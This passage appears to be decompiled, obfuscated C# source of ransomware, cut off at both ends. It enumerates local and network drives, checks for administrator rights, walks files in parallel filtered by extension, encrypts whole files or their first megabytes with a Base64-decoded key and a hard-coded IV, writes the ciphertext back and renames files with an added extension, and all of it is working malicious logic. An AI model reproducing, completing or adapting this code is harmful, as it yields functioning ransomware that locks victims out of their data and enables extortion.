				{
					streamWriter.WriteLine(getString_0(107395814));
					streamWriter.WriteLine(khBNqVxVYaM(getString_0(107390076)));
					streamWriter.WriteLine(YarXNhsRIUck.FgehTUZSzpVn());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !MFCrMNyVwftIF)
				{
					File.AppendAllText(text, getString_0(107390043) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(LImNkSPhwOOQHW, getString_0(107386079) + ex.Message + getString_0(107395814));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void snnMPiNHEe(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		kTXTIWfGzHEwJ.FkFVdMXbWymVrx CS_0024_003C_003E8__locals0 = new kTXTIWfGzHEwJ();
		CS_0024_003C_003E8__locals0.mJAooCuEQeBfV = string_1;
		CS_0024_003C_003E8__locals0.tcuSYIIomKFQ = string_2;
		CS_0024_003C_003E8__locals0.weaWcqsUGynTpn = string_3;
		CS_0024_003C_003E8__locals0.WHtCQmtmCerFiI = string_4;
		cjnjoiIOwY = Convert.FromBase64String(CS_0024_003C_003E8__locals0.weaWcqsUGynTpn);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396096))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = gnuFdBFgFHiiQ(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !qyAhWYLrtiOtS.Contains(text))
							{
								qyAhWYLrtiOtS.Add(text);
							}
							else if (!qyAhWYLrtiOtS.Contains(array[i].Name))
							{
								qyAhWYLrtiOtS.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!qyAhWYLrtiOtS.Contains(array[i].Name))
							{
								qyAhWYLrtiOtS.Add(array[i].Name);
							}
						}
					}
					else if (!qyAhWYLrtiOtS.Contains(array[i].Name))
					{
						qyAhWYLrtiOtS.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!qyAhWYLrtiOtS.Contains(string_0[i]))
				{
					qyAhWYLrtiOtS.Add(string_0[i]);
				}
			}
		}
		if (qyAhWYLrtiOtS.Contains(khBNqVxVYaM(getString_0(107386022))) && OCCDMTBKtUqAz == getString_0(107396866))
		{
			qyAhWYLrtiOtS.Remove(khBNqVxVYaM(getString_0(107386022)));
		}
		Parallel.ForEach(qyAhWYLrtiOtS, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new kTXTIWfGzHEwJ.FkFVdMXbWymVrx();
			CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm = string_0;
			if (WRwAKzNShnoL && !pIFGXSXFivCGoDR().Contains(kTXTIWfGzHEwJ.getString_0(107388615)) && !pIFGXSXFivCGoDR().Contains(kTXTIWfGzHEwJ.getString_0(107412137)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zZreWIIwDWlLBwg(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (mWfsjXfVaDjgsa == kTXTIWfGzHEwJ.getString_0(107396877))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					JeFURtIEpxub(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.mJAooCuEQeBfV, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.WHtCQmtmCerFiI, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.tcuSYIIomKFQ, CS_0024_003C_003E8__locals0.bwwPlADRDoUmZRx.weaWcqsUGynTpn);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				JeFURtIEpxub(CS_0024_003C_003E8__locals0.bxBPkBiQPHtaoYm, CS_0024_003C_003E8__locals0.mJAooCuEQeBfV, CS_0024_003C_003E8__locals0.WHtCQmtmCerFiI, CS_0024_003C_003E8__locals0.tcuSYIIomKFQ, CS_0024_003C_003E8__locals0.weaWcqsUGynTpn);
			}
		});
	}

	public static void JeFURtIEpxub(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389090));
		List<string> list3 = list2;
		if (LMpNgFGShlT == getString_0(107396304))
		{
			list = KHTvJHXHmaBmao(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = YhjuApFlyy.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03e4;
					}
				}
				if ((HVmQpJlElf == getString_0(107396304) && !item.EndsWith(text)) || lBBLtRfPsPV.Contains(item))
				{
					continue;
				}
				if (mdbUrlsnzSwt == getString_0(107396866))
				{
					try
					{
						if (HTdRYTdIWx.JWkurGLhKeTLl(item))
						{
							HTdRYTdIWx.FhwYvNuKmRb(item);
						}
					}
					catch
					{
					}
				}
				lBBLtRfPsPV.Add(item);
				if (!rEUVMKgscr.Contains(Path.GetDirectoryName(item)))
				{
					rEUVMKgscr.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZTtOBFIFhDPJ == getString_0(107396866) && fileStream.Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024 && !list3.Contains(text))
					{
						if (CMdYdSoRLCrMajhb == getString_0(107396866))
						{
							foreach (string item2 in hHDzREQRrQkqjKe)
							{
								if (item.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == getString_0(107396866))
								{
									if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == getString_0(107396304))
								{
									try
									{
										YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(getString_0(107389203), getString_0(107389166), getString_0(107389153), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = jhwgYCEJrwAyHhOqV.rylMDCeIQdlN(item, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
						byte[] aDuOpKdbopnXZSS = jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						jhwgYCEJrwAyHhOqV.POBdXBMelNFVnn(item, aDuOpKdbopnXZSS);
						if (string_2 != getString_0(107386045))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386045))
					{
						agRLrzzLVFGQ(item, item + string_2, cjnjoiIOwY);
					}
					else
					{
						agRLrzzLVFGQ(item, item + getString_0(107386040), cjnjoiIOwY);
					}
				}
				catch (Exception)
				{
				}
				IL_03e4:;
			}
		}
	}

	public static void CroFdsaclIJU(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		HbGtZiKmUw.vljTfCIVJtKHSZF CS_0024_003C_003E8__locals0 = new HbGtZiKmUw();
		CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa = list_0;
		CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = string_1;
		CS_0024_003C_003E8__locals0.JzXWXIIovwkoW = string_2;
		CS_0024_003C_003E8__locals0.kEFVKbULbQeU = string_3;
		CS_0024_003C_003E8__locals0.JQuaujjSravKN = new List<string> { getString_0(107389090) };
		if (HVmQpJlElf == getString_0(107396304))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa)
				{
					if (CS_0024_003C_003E8__locals0.JzXWXIIovwkoW.Length != 0)
					{
						string[] jzXWXIIovwkoW2 = CS_0024_003C_003E8__locals0.JzXWXIIovwkoW;
						int num2 = 0;
						while (num2 < jzXWXIIovwkoW2.Length)
						{
							string value2 = jzXWXIIovwkoW2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_0a3a;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.UfgTUBLEANxCD))
						{
							goto IL_0a3a;
						}
					}
					catch (Exception)
					{
						goto IL_0a3a;
					}
					if (item.EndsWith(string_0) && !lBBLtRfPsPV.Contains(item))
					{
						if (mdbUrlsnzSwt == HbGtZiKmUw.getString_0(107396885))
						{
							try
							{
								if (HTdRYTdIWx.JWkurGLhKeTLl(item))
								{
									HTdRYTdIWx.FhwYvNuKmRb(item);
								}
							}
							catch
							{
							}
						}
						lBBLtRfPsPV.Add(item);
						if (!rEUVMKgscr.Contains(Path.GetDirectoryName(item)))
						{
							rEUVMKgscr.Add(Path.GetDirectoryName(item));
						}
						ZJtjVIJZvG(item);
						try
						{
							new RhisUuNeBnW().SnwNkYfRWeFlkSm(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (qqVKUcwYqRObMU)
									{
										Console.WriteLine(HbGtZiKmUw.getString_0(107412132) + item + HbGtZiKmUw.getString_0(107412567) + new FileInfo(item).Length + HbGtZiKmUw.getString_0(107412578));
										Console.WriteLine(HbGtZiKmUw.getString_0(107412537));
									}
								}
								catch
								{
								}
								hsDlrZQtGPkuWD(khBNqVxVYaM(HbGtZiKmUw.getString_0(107412464)), HbGtZiKmUw.getString_0(107387677) + item + HbGtZiKmUw.getString_0(107387677) + khBNqVxVYaM(HbGtZiKmUw.getString_0(107412407)) + HbGtZiKmUw.getString_0(107387677) + Environment.UserName + HbGtZiKmUw.getString_0(107387677) + khBNqVxVYaM(HbGtZiKmUw.getString_0(107412422)));
							}
						}
						catch (Exception ex14)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + item + HbGtZiKmUw.getString_0(107412397) + ex14.Message + HbGtZiKmUw.getString_0(107395833));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02f0;
								}
								goto end_IL_02ef;
								end_IL_02f0:;
							}
							catch (Exception ex14)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + item + HbGtZiKmUw.getString_0(107411772) + ex14.Message + HbGtZiKmUw.getString_0(107395833));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								goto end_IL_02ef;
							}
							byte[] bytes2;
							if (!(ZTtOBFIFhDPJ == HbGtZiKmUw.getString_0(107396885)) || new FileInfo(item).Length <= Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024 || CS_0024_003C_003E8__locals0.JQuaujjSravKN.Contains(string_0))
							{
								if (eSjMTjCatON)
								{
									CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
								}
								bytes2 = Encoding.ASCII.GetBytes(jdzEbvPutazU);
								if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
								{
									if (!wRVzxmISkhBzKR)
									{
										if (!MFCrMNyVwftIF)
										{
											nQqNAlsrsLR(item, item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY);
										}
										else
										{
											nQqNAlsrsLR(item, item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
										}
									}
									else
									{
										try
										{
											if (!MFCrMNyVwftIF)
											{
												jDHUSaghZQjW(item, item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
											}
											else
											{
												jDHUSaghZQjW(item, item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
											}
										}
										catch (Exception ex14)
										{
											if (hIFJbdEMJudY)
											{
												try
												{
													File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + item + HbGtZiKmUw.getString_0(107386050) + ex14.Message + HbGtZiKmUw.getString_0(107395833));
												}
												catch (Exception)
												{
												}
											}
											gmdqiJfLiKSG++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02ef;
										}
									}
								}
								else if (!wRVzxmISkhBzKR)
								{
									if (!MFCrMNyVwftIF)
									{
										nQqNAlsrsLR(item, item + HbGtZiKmUw.getString_0(107386059), cjnjoiIOwY);
									}
									else
									{
										nQqNAlsrsLR(item, item + HbGtZiKmUw.getString_0(107386059), Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
									}
								}
								else
								{
									try
									{
										if (!MFCrMNyVwftIF)
										{
											jDHUSaghZQjW(item, item, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
										}
										else
										{
											jDHUSaghZQjW(item, item, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
										}
									}
									catch (Exception ex14)
									{
										if (hIFJbdEMJudY)
										{
											try
											{
												File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + item + HbGtZiKmUw.getString_0(107386050) + ex14.Message + HbGtZiKmUw.getString_0(107395833));
											}
											catch (Exception)
											{
											}
										}
										gmdqiJfLiKSG++;
										goto end_IL_02ef;
									}
								}
								if (MFCrMNyVwftIF)
								{
									if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
									{
										kwCznOOXZRpq(item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, bytes2);
									}
									else
									{
										kwCznOOXZRpq(item, bytes2);
									}
								}
								goto IL_0a3a;
							}
							CS_0024_003C_003E8__locals0 = new HbGtZiKmUw.QScawntZyyJuoh();
							CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
								{
									if (eSjMTjCatON)
									{
										CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD);
								}
							}
							catch (Exception ex14)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + item + HbGtZiKmUw.getString_0(107411711) + ex14.Message + HbGtZiKmUw.getString_0(107395833));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								goto end_IL_02ef;
							}
							CS_0024_003C_003E8__locals0.gJazcLYPjvD = HbGtZiKmUw.getString_0(107389109);
							if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
							{
								CS_0024_003C_003E8__locals0.gJazcLYPjvD = item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
							}
							else
							{
								CS_0024_003C_003E8__locals0.gJazcLYPjvD = item;
							}
							if (CMdYdSoRLCrMajhb == HbGtZiKmUw.getString_0(107396885))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in hHDzREQRrQkqjKe)
									{
										if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == HbGtZiKmUw.QScawntZyyJuoh.getString_0(107396888))
										{
											if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gJazcLYPjvD).Length)
											{
												try
												{
													YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(HbGtZiKmUw.QScawntZyyJuoh.getString_0(107389225), HbGtZiKmUw.QScawntZyyJuoh.getString_0(107389188), HbGtZiKmUw.QScawntZyyJuoh.getString_0(107389175), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == HbGtZiKmUw.QScawntZyyJuoh.getString_0(107396326))
										{
											try
											{
												YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(HbGtZiKmUw.QScawntZyyJuoh.getString_0(107389225), HbGtZiKmUw.QScawntZyyJuoh.getString_0(107389188), HbGtZiKmUw.QScawntZyyJuoh.getString_0(107389175), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							bytes2 = Encoding.ASCII.GetBytes(jdzEbvPutazU);
							if (iHEcKVZxNihtAo == HbGtZiKmUw.getString_0(107396323))
							{
								byte[] array2 = null;
								byte[] byte_2 = jhwgYCEJrwAyHhOqV.rylMDCeIQdlN(CS_0024_003C_003E8__locals0.gJazcLYPjvD, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
								if (jhwgYCEJrwAyHhOqV.POBdXBMelNFVnn(aDuOpKdbopnXZSS: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? yJUJkIUuqJMKqH.NzBtYERGLLff(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : yJUJkIUuqJMKqH.NzBtYERGLLff(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), tCxABdmTRJNTj: CS_0024_003C_003E8__locals0.gJazcLYPjvD, jVlQEpTxuNU: bytes2))
								{
									goto IL_0a3a;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!MFCrMNyVwftIF)
							{
								if (XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
								{
									goto IL_0a3a;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (XacBjLZheqmg.buINgJekbREt(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, bytes2, Convert.FromBase64String(HZePHYGbpexu)))
								{
									goto IL_0a3a;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02ef:;
						}
						catch (Exception)
						{
							goto IL_0a3a;
						}
					}
					continue;
					IL_0a3a:
					CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HbGtZiKmUw.vljTfCIVJtKHSZF();
			CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ksJAkzHcZyIN = string_0;
			if (CS_0024_003C_003E8__locals0.JzXWXIIovwkoW.Length != 0)
			{
				string[] jzXWXIIovwkoW = CS_0024_003C_003E8__locals0.JzXWXIIovwkoW;
				int num = 0;
				while (num < jzXWXIIovwkoW.Length)
				{
					string value = jzXWXIIovwkoW[num];
					if (!CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ae4;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(CS_0024_003C_003E8__locals0.UfgTUBLEANxCD))
				{
					goto IL_0ae4;
				}
			}
			catch (Exception)
			{
				goto IL_0ae4;
			}
			if (!lBBLtRfPsPV.Contains(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
			{
				if (mdbUrlsnzSwt == HbGtZiKmUw.getString_0(107396885))
				{
					try
					{
						if (HTdRYTdIWx.JWkurGLhKeTLl(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
						{
							HTdRYTdIWx.FhwYvNuKmRb(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
						}
					}
					catch
					{
					}
				}
				lBBLtRfPsPV.Add(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
				if (!rEUVMKgscr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN)))
				{
					rEUVMKgscr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN));
				}
				ZJtjVIJZvG(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
				try
				{
					new RhisUuNeBnW().SnwNkYfRWeFlkSm(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(HbGtZiKmUw.getString_0(107412132) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412567) + new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length + HbGtZiKmUw.getString_0(107412578));
								Console.WriteLine(HbGtZiKmUw.getString_0(107412537));
							}
						}
						catch
						{
						}
						hsDlrZQtGPkuWD(khBNqVxVYaM(HbGtZiKmUw.getString_0(107412464)), HbGtZiKmUw.getString_0(107387677) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107387677) + khBNqVxVYaM(HbGtZiKmUw.getString_0(107412407)) + HbGtZiKmUw.getString_0(107387677) + Environment.UserName + HbGtZiKmUw.getString_0(107387677) + khBNqVxVYaM(HbGtZiKmUw.getString_0(107412422)));
					}
				}
				catch (Exception ex2)
				{
					if (hIFJbdEMJudY)
					{
						try
						{
							File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412397) + ex2.Message + HbGtZiKmUw.getString_0(107395833));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length != 0L)
						{
							goto end_IL_032e;
						}
						goto end_IL_032d;
						end_IL_032e:;
					}
					catch (Exception ex2)
					{
						if (hIFJbdEMJudY)
						{
							try
							{
								File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107411772) + ex2.Message + HbGtZiKmUw.getString_0(107395833));
							}
							catch (Exception)
							{
							}
						}
						gmdqiJfLiKSG++;
						goto end_IL_032d;
					}
					if (ZTtOBFIFhDPJ == HbGtZiKmUw.getString_0(107396885) && new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
							{
								if (eSjMTjCatON)
								{
									CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
								}
								File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD);
							}
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107386818) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107411711) + ex2.Message + HbGtZiKmUw.getString_0(107395833));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386064))
						{
							CS_0024_003C_003E8__locals0.ksJAkzHcZyIN += CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
						}
						if (CMdYdSoRLCrMajhb == HbGtZiKmUw.getString_0(107396885))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in hHDzREQRrQkqjKe)
								{
									if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107396891))
									{
										if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length)
										{
											try
											{
												YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389228), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389191), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389178), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item3) && TQwKQbvIHjGUX == HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107396329))
									{
										try
										{
											YarXNhsRIUck.ZqWoMKKMhbIQyDVFg(HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389228), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389191), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389178), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
						if (iHEcKVZxNihtAo == HbGtZiKmUw.getString_0(107396323))
						{
							byte[] array = null;
							byte[] byte_ = jhwgYCEJrwAyHhOqV.rylMDCeIQdlN(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
							if (!jhwgYCEJrwAyHhOqV.POBdXBMelNFVnn(aDuOpKdbopnXZSS: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jhwgYCEJrwAyHhOqV.rvzzzwdOzrGU(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : yJUJkIUuqJMKqH.NzBtYERGLLff(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), tCxABdmTRJNTj: CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, jVlQEpTxuNU: bytes))
							{
								try
								{
